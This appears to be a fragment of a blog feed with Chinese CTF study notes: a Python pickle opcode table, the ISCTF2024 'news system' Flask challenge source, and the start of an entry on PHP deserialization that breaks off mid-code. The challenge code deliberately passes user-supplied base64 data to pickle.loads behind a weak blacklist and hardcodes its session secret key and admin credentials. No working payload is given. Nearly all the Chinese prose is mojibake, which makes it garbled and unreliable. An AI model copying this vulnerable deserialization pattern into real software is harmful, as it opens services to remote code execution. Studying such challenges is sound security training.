      <link href="/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>Learnd From: <a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p><h3 id="ä»€ä¹ˆæ˜¯Pickleï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Pickleï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Pickleï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Pickleï¼Ÿ</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">pickleæ˜¯Pythonä¸­ä¸€ä¸ªèƒ½å¤Ÿåºåˆ—åŒ–å’Œååºåˆ—åŒ–å¯¹è±¡çš„æ¨¡å—ã€‚å’Œå…¶ä»–è¯­è¨€ç±»ä¼¼ï¼ŒPythonä¹Ÿæä¾›äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿™ä¸€åŠŸèƒ½ï¼Œå…¶ä¸­ä¸€ä¸ªå®ç°æ¨¡å—å°±æ˜¯pickleã€‚åœ¨Pythonä¸­ï¼Œ*â€œPicklingâ€* æ˜¯å°† Python å¯¹è±¡åŠå…¶æ‰€æ‹¥æœ‰çš„å±‚æ¬¡ç»“æ„è½¬åŒ–ä¸ºä¸€ä¸ª**äºŒè¿›åˆ¶å­—èŠ‚æµ**çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„åºåˆ—åŒ–ï¼Œè€Œ *â€œunpicklingâ€* æ˜¯ç›¸åçš„æ“ä½œï¼Œä¼šå°†å­—èŠ‚æµè½¬åŒ–å›ä¸€ä¸ªå¯¹è±¡å±‚æ¬¡ç»“æ„ã€‚</span><br><span class="line"></span><br><span class="line">å½“ç„¶åœ¨Python ä¸­å¹¶ä¸æ­¢pickleä¸€ä¸ªæ¨¡å—èƒ½å¤Ÿè¿›è¡Œè¿™ä¸€æ“ä½œï¼Œæ›´åŸå§‹çš„åºåˆ—åŒ–æ¨¡å—å¦‚`marshal`ï¼ŒåŒæ ·èƒ½å¤Ÿå®Œæˆåºåˆ—åŒ–çš„ä»»åŠ¡ï¼Œä¸è¿‡ä¸¤è€…çš„ä¾§é‡ç‚¹å¹¶ä¸ç›¸åŒï¼Œ`marshal`å­˜åœ¨ä¸»è¦æ˜¯ä¸ºäº†æ”¯æŒ Python çš„`.pyc`æ–‡ä»¶ã€‚ç°åœ¨å¼€å‘æ—¶ä¸€èˆ¬é¦–é€‰pickleã€‚</span><br><span class="line"></span><br><span class="line">pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§**ç‹¬ç«‹çš„è¯­è¨€**ï¼Œé€šè¿‡å¯¹`opcode`çš„ç¼–å†™å¯ä»¥è¿›è¡ŒPythonä»£ç æ‰§è¡Œã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„`opcode`çµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œå¹¶ä¸”æœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">æ—¢ç„¶opcodeèƒ½å¤Ÿæ‰§è¡ŒPythonä»£ç ï¼Œé‚£è‡ªç„¶å°±å…ä¸äº†å®‰å…¨é—®é¢˜ã€‚ä»¥ä¸‹æ˜¯Pythonåœ¨pickleæ–‡æ¡£ä¸­çš„è­¦å‘Šã€‚</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨opcode"><a href="#å¸¸ç”¨opcode" class="headerlink" title="å¸¸ç”¨opcode"></a>å¸¸ç”¨opcode</h3><p>åœ¨Pythonçš„pickle.pyä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°æ‰€æœ‰çš„opcodeåŠå…¶è§£é‡Šï¼Œå¸¸ç”¨çš„opcodeå¦‚ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥V0ç‰ˆæœ¬ä¸ºä¾‹</p><table><thead><tr><th align="left">æŒ‡ä»¤</th><th align="left">æè¿°</th><th align="left">å…·ä½“å†™æ³•</th><th align="left">æ ˆä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th><th align="center"></th></tr></thead><tbody><tr><td align="left">c</td><td align="left">è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—</td><td align="left">c[module]\n[instance]\n</td><td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">o</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td align="left">o</td><td align="center">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td align="left">i</td><td align="left">ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td align="left">i[module]\n[callable]\n</td><td align="center">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td align="left">N</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td align="left">N</td><td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">S</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td align="left">Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">V</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td align="left">Vxxx\n</td><td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">I</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td align="left">Ixxx\n</td><td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">F</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td align="left">Fx.x\n</td><td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">R</td><td align="left">é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td align="left">R</td><td align="center">å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td></tr><tr><td align="left">.</td><td align="left">ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td align="left">.</td><td align="center">æ— </td></tr><tr><td align="left">(</td><td align="left">å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td align="left">(</td><td align="center">MARKæ ‡è®°å…¥æ ˆ</td></tr><tr><td align="left">t</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td align="left">t</td><td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">)</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td align="left">)</td><td align="center">ç©ºå…ƒç»„å…¥æ ˆ</td></tr><tr><td align="left">l</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td align="left">l</td><td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">]</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td align="left">]</td><td align="center">ç©ºåˆ—è¡¨å…¥æ ˆ</td></tr><tr><td align="left">d</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td align="left">d</td><td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">}</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td align="left">}</td><td align="center">ç©ºå­—å…¸å…¥æ ˆ</td></tr><tr><td align="left">p</td><td align="left">å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td align="left">pn\n</td><td align="center">æ— </td></tr><tr><td align="left">g</td><td align="left">å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td align="left">gn\n</td><td align="center">å¯¹è±¡è¢«å‹æ ˆ</td></tr><tr><td align="left">0</td><td align="left">ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td align="left">0</td><td align="center">æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td></tr><tr><td align="left">b</td><td align="left">ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td align="left">b</td><td align="center">æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td></tr><tr><td align="left">s</td><td align="left">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td align="left">s</td><td align="center">ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td></tr><tr><td align="left">u</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td align="left">u</td><td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td></tr><tr><td align="left">a</td><td align="left">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td align="left">a</td><td align="center">æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td></tr><tr><td align="left">e</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td align="left">e</td><td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td></tr></tbody></table><h1 id="ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘"><a href="#ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘" class="headerlink" title="ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘"></a>ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘</h1><p>å‰é¢å°±æ˜¯session ä¼ªé€ ä¸å¤šè¯´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">æºç ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;W3l1com_isCTF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">News</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.title = title</span><br><span class="line">        <span class="variable language_">self</span>.content = content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;news(name=<span class="subst">&#123;self.title&#125;</span>, words=<span class="subst">&#123;self.content&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NewsList</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.news_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_news</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        news = News(title,content)</span><br><span class="line">        <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_news</span>(<span class="params">self, news_title</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        news = <span class="variable language_">self</span>.get_news(news_title)</span><br><span class="line">        <span class="keyword">if</span> news <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.news_list.remove(news)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_news</span>(<span class="params">self, serialized_news</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            news_data = base64.b64decode(serialized_news)</span><br><span class="line">            black_list = [<span class="string">&#x27;create_news&#x27;</span>,<span class="string">&#x27;export_news&#x27;</span>,<span class="string">&#x27;add_news&#x27;</span>,<span class="string">&#x27;get_news&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">str</span>(news_data):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            news = pickle.loads(news_data) <span class="comment">#ä½¿ç”¨ pickle.loads å°†è§£ç åçš„æ•°æ®ååºåˆ—åŒ–æˆ Python å¯¹è±¡</span></span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(news,News):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">                    <span class="keyword">if</span> i.title == news.title:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_news</span>(<span class="params">self, news_title</span>) -&gt; News | <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> news <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(news.title) == news_title:</span><br><span class="line">                <span class="keyword">return</span> news</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newslist = NewsList()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;test111&#x27;</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>] = password</span><br><span class="line">            session[<span class="string">&#x27;status&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/news&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;login_error&#x27;</span>] = <span class="literal">True</span>               </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;news.html&quot;</span>,news = news)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>,news = news)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/export&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">export_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news_title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    result = newslist.export_news(news_title)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>: result&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;news not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/add&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)    </span><br><span class="line">    serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to add news&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>ä¼ªé€ è¿›å…¥&#x2F;admin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">news_data = base64.b64decode(serialized_news)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°addè·¯ç”±å¯ä»¥è¿›è¡Œååºåˆ—åŒ–</p><p>å‚è€ƒäº† <a href="https://xz.aliyun.com/t/16227?time__1311=GuD=PRxGrh8D/WNiQGkDuQrKj8DmE+bD#toc-7">https://xz.aliyun.com/t/16227?time__1311=GuD%3DPRxGrh8D%2FWNiQGkDuQrKj8DmE%2BbD#toc-7</a></p><p>è‡ªå·±æš‚æ—¶è¿˜ä¸ä¼šæ„é€  ç„¶å å¯ä»¥å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> unserialize </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ– + GCå›æ”¶æœºåˆ¶</title>
      <link href="/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>f å¤ç°çš„æ—¶å€™gcå›æ”¶æœºåˆ¶å‘ç°ä¸ä¼š å†™å‡ºæ¥å½“ç¬”è®°äº†</p><p>å­¦ä¹ fromï¼š<a href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=QaqiI3Y5p2GbD">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DQaqiI3Y5p2GbD</a></p><p>ç›´æ¥æ‹¿isctfçš„é¢˜ç›®æ¥è¿›è¡Œç»ƒä¹ </p><h2 id="å¤©å‘½äºº"><a href="#å¤©å‘½äºº" class="headerlink" title="å¤©å‘½äºº"></a>å¤©å‘½äºº</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">\<span class="comment"># å¸®å¤©å‘½äººæœé›†æ³•å®ï¼Œé‡è·é½å¤©ä¹‹å§¿ï¼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$wu</span>=<span class="string">&quot;ä¿ºè€å­™å®šè¦è¸ç ´è¿™äº”æŒ‡å±±ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$j</span></span>)</span></span><br><span 